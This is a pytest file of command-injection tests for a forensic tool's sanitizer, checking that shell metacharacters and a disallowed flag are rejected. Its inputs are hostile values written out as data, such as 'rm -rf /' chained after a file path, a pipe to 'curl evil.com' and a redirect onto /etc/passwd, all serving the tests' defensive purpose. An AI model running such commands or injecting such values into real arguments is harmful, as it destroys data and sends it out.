"""Command injection security tests - 16 cases."""
from __future__ import annotations

import pytest

from sift_hunter.core.exceptions import CommandInjectionError, UnauthorizedBinaryError
from sift_hunter.mcp_server.security.command_sanitizer import sanitize_args, validate_command


pytestmark = pytest.mark.unit


def test_injection_semicolon():
    """Semicolon blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem; rm -rf /"])


def test_injection_pipe():
    """Pipe blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem | curl evil.com"])


def test_injection_backtick():
    """Backtick blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["`rm evidence.mem`"])


def test_injection_dollar_paren():
    """$(command) blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["$(whoami)"])


def test_injection_dollar_brace():
    """${VAR} blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["${HOME}"])


def test_injection_ampersand():
    """Ampersand blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem & rm -rf /"])


def test_injection_newline():
    r"""Newline \n blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem\nrm -rf /"])


def test_injection_carriage_return():
    r"""Carriage return \r blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem\rrm -rf /"])


def test_injection_null_byte():
    """Null byte blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem\x00"])


def test_injection_redirect_out():
    """Output redirect > blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem > /etc/passwd"])


def test_injection_redirect_in():
    """Input redirect < blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["/cases/evidence.mem < /dev/random"])


def test_injection_exclamation():
    """Exclamation mark blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["!rm"])


def test_injection_parentheses():
    """Parentheses blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["(rm -rf /)"])


def test_injection_curly_braces():
    """Curly braces blocked."""
    with pytest.raises(CommandInjectionError):
        sanitize_args(["{rm,-rf,/}"])


def test_clean_args_pass():
    """Clean args with no injection chars pass through."""
    args = ["-f", "/cases/evidence.dd", "--csv", "/tmp/sift-output/"]
    result = sanitize_args(args)
    assert result == args


def test_flag_not_on_allowlist_blocked():
    """A flag not on the allowlist raises UnauthorizedBinaryError."""
    with pytest.raises(UnauthorizedBinaryError):
        validate_command("MFTECmd", ["--delete"])


def test_volatility_plugin_name_allowed():
    """Volatility plugin positional arg allowed."""
    # Just validate_command doesn't raise - binary may not be installed
    try:
        validate_command("vol", ["-f", "test.mem", "windows.pslist.PsList"])
    except UnauthorizedBinaryError:
        pytest.fail("Volatility plugin name should be allowed")
